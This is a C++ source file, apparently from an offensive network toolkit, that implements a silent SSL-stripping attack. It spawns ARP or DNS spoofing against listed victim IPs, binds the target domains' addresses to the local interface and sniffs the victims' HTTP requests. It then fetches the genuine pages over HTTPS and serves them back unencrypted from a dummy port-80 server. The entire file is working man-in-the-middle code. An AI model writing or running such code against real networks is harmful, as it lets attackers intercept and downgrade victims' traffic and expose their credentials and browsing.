#include "ssl_stripping/silent.h"
#include "HttpLayer.h"
#include "IPv4Layer.h"
#include "IpAddress.h"
#include "Packet.h"
#include "PcapFilter.h"
#include "PcapLiveDevice.h"
#include "RawPacket.h"
#include "TcpLayer.h"
#include "common/common.h"
#include "log.h"
#include "ssl_stripping/public.h"
#include <algorithm>
#include <boost/asio/connect.hpp>
#include <boost/asio/io_context.hpp>
#include <boost/asio/ip/address.hpp>
#include <boost/asio/ip/basic_resolver.hpp>
#include <boost/asio/ip/tcp.hpp>
#include <boost/asio/read.hpp>
#include <boost/asio/ssl/context.hpp>
#include <boost/asio/ssl/stream.hpp>
#include <boost/asio/streambuf.hpp>
#include <boost/asio/write.hpp>
#include <boost/system/error_code.hpp>
#include <condition_variable>
#include <exception>
#include <future>
#include <mutex>
#include <queue>
#include <sstream>
#include <stdexcept>
#include <thread>
#include <unordered_set>
#include <vector>

#ifdef __linux__
#include <csignal>
#include <sys/prctl.h>
#include <sys/types.h>
#include <unistd.h>

void ATK::SSL::SilentSslStrippingStrategy::cleanup(int signum) {
    LOG_INFO("Caught signal " + std::to_string(signum) + ", cleaning up...\n");

    for (const std::string& ipx : domainIps_) {
        std::string cmd = "ip addr del " + ipx + "/32 dev " + device_->getName();
        std::system(cmd.c_str());
    }

    std::exit(0);
}
#endif

void ATK::SSL::SilentSslStrippingStrategy::runHttpDummyServer() {
    const uint16_t HTTP_PORT = 80;
    std::thread([]() {
        try {
            boost::asio::io_context ioc;
            boost::asio::ip::tcp::acceptor acceptor(
                ioc, boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(),
                                                    HTTP_PORT));

            while (true) {
                boost::asio::ip::tcp::socket socket(ioc);
                acceptor.accept(socket);

                auto &httpMessageData = getHttpMessageData();

                // Wait for a packet size to be available
                std::unique_lock<std::mutex> lock(
                    httpMessageData.httpMessagesMutex);
                httpMessageData.httpMessagesCV.wait(lock, [&] {
                    return !httpMessageData.httpMessages.empty();
                });

                const std::string httpMessage =
                    httpMessageData.httpMessages.front();
                httpMessageData.httpMessages.pop();
                lock.unlock();

                std::ostringstream response;
                response << "HTTP/1.1 200 OK\r\n"
                         << "Content-Type: text/html\r\n"
                         << "Content-Length: " << httpMessage.length() << "\r\n"
                         << "Connection: close\r\n"
                         << "\r\n"
                         << httpMessage;

                boost::system::error_code exc;
                LOG_INFO("Sending back stripped HTTP response")
                boost::asio::write(socket, boost::asio::buffer(response.str()),
                                   exc);

                socket.close();
            }
        } catch (const std::exception &e) {
            LOG_ERROR("Dummy HTTP server exception: " + std::string(e.what()));
        }
    }).detach(); // detach the thread to let it run in background
}

std::optional<std::unordered_set<std::string>>
ATK::SSL::SilentSslStrippingStrategy::resolveDomainToIP(
    const std::string &domain, const std::string &service) {
    std::unordered_set<std::string> outputIps;
    try {
        boost::asio::io_context ioc;

        boost::asio::ip::tcp::resolver resolver(ioc);

        // Resolve the endpoints against the domain name
        boost::system::error_code
            exc; // To capture errors without throwing exceptions immediately
        const boost::asio::ip::tcp::resolver::results_type endpoints =
            resolver.resolve(domain, service, exc);

        if (exc) {
            LOG_ERROR("Boost.Asio resolve failed for " + domain +
                      ". Error message: " + exc.message());
            return std::nullopt; // Return empty list on error
        }

        // Iterate through the resolved endpoints and extract IP addresses
        for (const auto &entry : endpoints) {
            const auto &addr = entry.endpoint().address();
            if (addr.is_v4()) {
                outputIps.insert(addr.to_string());
            }
        }

    } catch (const boost::system::system_error &e) {
        // Catch boost.asio specific exceptions
        LOG_ERROR("Boost.Asio System Exception during resolution for " +
                  domain + ". Error message: " + e.what() +
                  ". Error code: " + e.code().to_string());
    } catch (const std::exception &e) {
        // Catch other standard exceptions
        LOG_ERROR("Standard Exception during resolution for " + domain +
                  ". Error message: " + e.what());
    }
    return outputIps;
}

std::optional<std::string>
ATK::SSL::SilentSslStrippingStrategy::connectWithServer(
    const std::string &domain) {
    try {
        const std::string HTTPS_PORT = "443";

        // Setup the asio and SSL context
        boost::asio::io_context ioc;
        boost::asio::ssl::context ssl_ctx(
            boost::asio::ssl::context::tls_client);

        // Tell asio to use the default system certificate store
        ssl_ctx.set_default_verify_paths();

        // Create the SSL stream, wrapping a TCP socket
        boost::asio::ssl::stream<boost::asio::ip::tcp::socket> stream(ioc,
                                                                      ssl_ctx);

        // Tell the server which website you want to talk to.
        SSL_set_tlsext_host_name(stream.native_handle(), domain.c_str());

        // Resolve the hostname to an IP address
        boost::asio::ip::tcp::resolver resolver(ioc);
        auto endpoints = resolver.resolve(domain, HTTPS_PORT);

        // Connect the underlying TCP socket
        boost::asio::connect(stream.lowest_layer(), endpoints);

        // Perform the TLS Handshake
        stream.handshake(boost::asio::ssl::stream_base::client);

        LOG_INFO("Handshake successful!");

        // Send an HTTP GET request over the secure stream
        std::string request = "GET / HTTP/1.1\r\nHost: " + domain +
                              "\r\nConnection: close\r\n\r\n";
        boost::asio::write(stream, boost::asio::buffer(request));

        // Read the response
        boost::asio::streambuf response;
        boost::system::error_code exc;
        boost::asio::read(stream, response, exc);

        // Check for a clean close
        if (exc == boost::asio::error::eof) {
            LOG_INFO("Cleanly received real server response");
            std::istream response_stream(&response);
            std::string line;
            bool in_body = false;

            std::ostringstream html_body;

            while (std::getline(response_stream, line)) {
                if (!in_body) {
                    // Look for the blank line between headers and body
                    if (line == "\r" || line.empty()) {
                        in_body = true;
                    }
                } else {
                    html_body << line << "\n";
                }
            }

            return html_body.str();
        }
        if (exc) {
            throw boost::system::system_error(exc);
        }
        return std::nullopt;
    } catch (std::exception &e) {
        LOG_ERROR("Exception: " + std::string(e.what()));
        return std::nullopt;
    }
}

void ATK::SSL::SilentSslStrippingStrategy::onPacketArrives(
    pcpp::RawPacket *packet, pcpp::PcapLiveDevice * /*device*/,
    void * /*cookie*/) {
    const pcpp::Packet parsedPacket(packet);

    // Check IPv4 layer
    auto *ipLayer = parsedPacket.getLayerOfType<pcpp::IPv4Layer>();
    if (ipLayer == nullptr) {
        return;
    }

    // Check if source IP matches some victim IP
    if (std::find(victimIps_.begin(), victimIps_.end(),
                  ipLayer->getSrcIPAddress().toString()) == victimIps_.end()) {
        return;
    }

    // Check TCP layer
    auto *tcpLayer = parsedPacket.getLayerOfType<pcpp::TcpLayer>();
    const int HTTP_PORT = 80;
    if ((tcpLayer == nullptr) || tcpLayer->getDstPort() != HTTP_PORT) {
        return;
    }

    // Access HTTP Layer
    auto *httpRequestLayer =
        parsedPacket.getLayerOfType<pcpp::HttpRequestLayer>();
    if (httpRequestLayer == nullptr) {
        return;
    }

    // Check if method is GET
    if (httpRequestLayer->getFirstLine()->getMethod() !=
        pcpp::HttpRequestLayer::HttpGET) {
        return;
    }

    // Check Host header
    pcpp::HeaderField *hostField = httpRequestLayer->getFieldByName("Host");
    if (hostField == nullptr) {
        return;
    }

    // Check whether domain is in Host header and start SSL attack if so
    const std::string hostValue = hostField->getFieldValue();
    for (const std::string &domain : domainsToStrip_) {
        if (hostValue.find(domain) != std::string::npos) {
            auto &httpMessageData = getHttpMessageData();
            LOG_INFO("Connecting to " + domain + "...");
            std::optional<std::string> realHtmlFromServer =
                connectWithServer(domain);
            if (!realHtmlFromServer.has_value()) {
                LOG_ERROR("Could not connect to server!");
                continue;
            }

            // Add HTML code to queue for HTTP response
            {
                const std::lock_guard<std::mutex> lock(
                    httpMessageData.httpMessagesMutex);
                httpMessageData.httpMessages.emplace(
                    realHtmlFromServer.value() + "\n");
            }
            httpMessageData.httpMessagesCV.notify_one();
        }
    }
}

void ATK::SSL::SilentSslStrippingStrategy::execute() {
    std::string cmd;
    if (mitmStrategy_ == ATK::SSL::MitmStrategy::ARP) {
        // Initialize options with values based on this call
        std::string victimIpsCommaSeparated;
        for (const auto &victimIp : victimIps_) {
            victimIpsCommaSeparated += (victimIp.toString());
            victimIpsCommaSeparated += ',';
        };
        victimIpsCommaSeparated.pop_back();

        std::string ipsToSpoofCommaSeparated;

        // Get all target IPs from domain
        for (const std::string &domain : domainsToStrip_) {
            std::optional<std::unordered_set<std::string>> currentIps =
                resolveDomainToIP(domain, "https");
            if (currentIps.has_value()) {
                domainIps_ = currentIps.value();
                for (const auto &currentIp : currentIps.value()) {
                    ipsToSpoofCommaSeparated += currentIp;
                    ipsToSpoofCommaSeparated += ',';
                    #ifdef __linux__
                    std::string cmd = "ip addr add " + currentIp + "/32 dev " + device_->getName();
                    std::system(cmd.c_str());
                    static ATK::SSL::SilentSslStrippingStrategy* thisInstance = this;

                    std::signal(SIGINT, [](int signum) {
                        thisInstance->cleanup(signum);
                    });
                    #endif
                }
            }
        }
        if (ipsToSpoofCommaSeparated.empty()) {
            throw std::runtime_error(
                "Unable to resolve any IPv4 addresses from domains provided");
        }
        ipsToSpoofCommaSeparated.pop_back();

        std::ostringstream command;
        command
            << "\"" << ATK::Common::getProcessName() << "\" --quiet --arp"
            << " \"" << device_->getName() << "\""
            << " \"\"" // Supply empty attackerMac to automatically derive it
            << " \"" << victimIpsCommaSeparated << "\""
            << " \"" << ipsToSpoofCommaSeparated << "\"";
        cmd = command.str();
    } else { // Perform DNS spoofing in the background
        // Initialize options with values based on this call
        std::string victimIpsCommaSeparated;
        for (const auto &victimIp : victimIps_) {
            victimIpsCommaSeparated += victimIp.toString();
            victimIpsCommaSeparated += ',';
        };
        victimIpsCommaSeparated.pop_back();

        std::string domainsToStripCommaSeparated;

        // Get all target IPs from domain
        for (const std::string &domain : domainsToStrip_) {
            domainsToStripCommaSeparated += domain;
            domainsToStripCommaSeparated += ',';
        }
        domainsToStripCommaSeparated.pop_back();

        std::ostringstream command;
        command << "\"" << ATK::Common::getProcessName() << "\" --quiet --dns"
                << " \"" << device_->getName() << "\""
                << " \"" << attackerIp_.toString() << "\""
                << " \"" << victimIpsCommaSeparated << "\""
                << " \"" << domainsToStripCommaSeparated << "\"";
        cmd = command.str();
    }
    // Start ARP/DNS spoofing on different thread
#ifdef _WIN32
    HANDLE hJob = CreateJobObject(nullptr, nullptr);

    JOBOBJECT_EXTENDED_LIMIT_INFORMATION info = {};
    info.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
    SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &info,
                            sizeof(info));

    STARTUPINFO sInfo = {sizeof(sInfo)};
    PROCESS_INFORMATION pInfo;

    CreateProcess(nullptr, cmd.data(), nullptr, nullptr, FALSE, 0, nullptr,
                  nullptr, &sInfo, &pInfo);

    // Link child to the job
    AssignProcessToJobObject(hJob, pInfo.hProcess);

    CloseHandle(pInfo.hProcess);
    CloseHandle(pInfo.hThread);
#else
    const pid_t pid = fork();
    if (pid == 0) {
        // To make sure child kills itself when this process dies
        // NOLINTNEXTLINE(cppcoreguidelines-pro-type-vararg,hicpp-vararg)
        prctl(PR_SET_PDEATHSIG, SIGTERM);
        // NOLINTNEXTLINE(cppcoreguidelines-pro-type-vararg,hicpp-vararg)
        execl("/bin/sh", "sh", "-c", cmd.c_str(), nullptr);
        _exit(1);
    }
#endif

    runHttpDummyServer();

    if (!device_->open()) {
        throw std::runtime_error("Unable to open interface");
    }

    std::promise<void> completionPromise;
    std::future<void> completionFuture = completionPromise.get_future();

    if (!device_->setFilter("tcp dst port 80")) {
        LOG_ERROR("Cannot set tcp filter");
        device_->close();
        throw std::runtime_error(
            "Unable to set http request filters on interface");
    };

    if (!device_->startCapture(
            [this](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device,
                   void *cookie) { onPacketArrives(packet, device, cookie); },
            &completionFuture)) {
        device_->close();
        throw std::runtime_error("Unable to start capturing http packets");
    };

    try {
        completionFuture.get();
    } catch (const std::exception &e) {
        device_->close();
    }

    device_->close();
}
